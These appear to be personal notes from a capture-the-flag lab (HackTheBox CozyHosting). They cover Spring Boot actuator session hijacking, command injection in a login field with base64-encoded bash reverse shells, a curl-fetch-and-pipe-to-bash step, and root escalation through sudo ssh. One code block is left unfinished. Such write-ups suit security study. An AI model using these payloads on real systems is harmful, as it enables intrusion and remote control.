- ffuf, gobuster, dirbuster don't return anything useful.
	- /assets/.. subdirectory
		- not accessible.
		- says no /error location so displayed on screen
			- exploitable?
- BurpSuite
	- we see cookie
- Login page 
	- we try to login and we get an error message that prompts us to check /error page
		- we get this whitelabel error
		- on searching about this we see its related to Spring Boot java application
			- we have a wordlist for this
- 2 ways to go about, ffuf (from walkthrough), I used dirsearch, maybe i got lucky:
	- ffuf enumeration:
		- first before knowing about spring boot:
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-
medium.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
```
- we get some like index, login, admin, logout, error
- after finding out about spring boot
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FFUZ
-u http://cozyhosting.htb/FFUZ -ic -t 100
```
- we find actuator path is accessible
- **maybe got lucky with this search** from dirsearch we find /actuator directory
```bash
dirsearch -u cozyhosting.htb
```
- leaders us to /actuator/sessions which holds user session key
- we can change that either in burp suite or in our browser by changing our cookie to that
- we login as admin of web page
- we see connection settings where we can enter address
	- we try ours but connection refused obvously
	- we try localhost as kadmin but we get rejected as we dont have key
		- we try to inject code in both fields and find username is injectable
```bash
;<command>;
```
### Testing the connect option below
- we try to connect to localhost while we test for injection
- we find that we can inject by putting our code into  the username field
- **Method 1 : IPPSec**
	- we again connect to localhost and capture a test input in username.
	- capture packet in BurpSuite > Send to Repeater
	- enter this command  into username field while having nettcat listener on and send packet:
```bash
;{sleep,2}; # to test, we see a delay
;{echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvPGxvY2FsX2lwPi85OTk4ICAwPiYxICAK}|{base64,-d}|bash;
```
- How? We create our exploit, base 64 encode it, remove the additional +, = characters and then pass it to burpsuite
	- we also see the last bash command isnt in {}
			- test in our machine if the command executes to reverse shell. 
			- we see bash with {} doesn't work
```bash
vi shell # bash -i >& /dev/tcp/<local_ip>/9998 0>&1 
base64 -w 0 shell
{echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvPGxvY2FsX2lwPi85OTk4ICAwPiYxICAK}|{base64,-d}|bash
```
- Alternatively, instead of adding spaces, you could siply add the command to our burp suite and url encode (Ctrl+U) and it will look like this :
```bash
host=127.0.0.1&username=%3b{echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yNS85OTk5IDA%2bJjEK}|{base64,-d}|bash%3b
```
**Note: we see , and when testing in bash it won't work. testing with , works in zsh so keep that in mind**
- in walkthrough pdf we do see a different way which i believe is compatible for bash
```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh
```
- We see they use \n instead of ,
- then in our username injection input we pass this command while listening on our netcat listener:
```bash
test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;
```
- $(IFS) works with curl (but not a bash command..why?)
- represents space
- calls our command and executes via bash
- We gain foothold as appp but not user for user flag
- unzip the jar file
	- we find credentials is:
```bash
app@cozyhosting:/tmp/app/BOOT-INF/classes$ cat application.properties
cat application.properties

## Privilege Escalation 
- sudo -l reveals ssh can be used as sudo
- Check GTFObins for ssh shell
- These commands work :
```bash
ssh -o ProxyCommand=';sh 0<&2 1>&2' x
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
```
- Why?
- It is a way to pass a command before ssh'ing into the machine. Why?
		- before when connecting to a machine behind a firewall, a direct connection wouldnt work due to say a good firewall.
		- So people would ssh into a Bastion machine which would do something like
		- ssh -L `<port>` `<host>` and forward the ssh to the target machine
		- but if the ssh tunnel isn't active before ssh'ing into the machine it wouldn't work
		- so this makes things easier by making sure it passes the ssh command before we ssh into the machine
- We get root access
